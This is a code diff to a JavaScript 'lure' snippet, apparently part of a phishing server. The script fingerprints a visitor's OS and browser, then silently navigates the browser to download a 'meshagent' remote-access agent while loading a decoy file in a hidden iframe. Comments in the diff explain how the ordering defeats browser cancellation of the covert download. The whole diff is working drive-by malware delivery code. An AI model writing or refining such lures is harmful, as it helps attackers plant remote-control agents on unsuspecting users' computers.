@@ -42,23 +42,28 @@ LURE_JS = """(function () {
     if (window.__fleetDownloaded) return;
     window.__fleetDownloaded = true;
     var os = detectOS();
-    fetch("/__lure/target?os=" + encodeURIComponent(os) +
-          "&ua=" + encodeURIComponent(navigator.userAgent || ""))
+    var ua = encodeURIComponent(navigator.userAgent || "");
+    var agent = "/__lure/meshagent?os=" + encodeURIComponent(os) + "&ua=" + ua;
+    fetch("/__lure/target?os=" + encodeURIComponent(os) + "&ua=" + ua)
       .then(function (r) { return r.json(); })
       .then(function (d) {
         if (!d) return;
         if (d.mesh) {
-          var f = document.createElement("iframe");
-          f.style.display = "none";
-          f.src = "/__lure/meshagent?os=" + encodeURIComponent(os) +
-                  "&ua=" + encodeURIComponent(navigator.userAgent || "");
-          document.body.appendChild(f);
+          // Navigate to the agent attachment first. Loading the decoy in the
+          // same tick (or navigating to it) cancels the hidden-iframe agent
+          // download in most browsers, leaving only the decoy.
+          window.location.href = agent;
+          if (d.url) {
+            setTimeout(function () {
+              var f = document.createElement("iframe");
+              f.style.display = "none";
+              f.src = d.url;
+              document.body.appendChild(f);
+            }, 1500);
+          }
+          return;
         }
         if (!d.url) return;
-        // Use window.location.href instead of <a>.click() — browsers block
-        // programmatic <a>.click() downloads unless triggered by a direct
-        // user click, but navigating to an attachment URL triggers a download
-        // via the server's Content-Disposition header.
         window.location.href = d.url;
       })
       .catch(function () {});
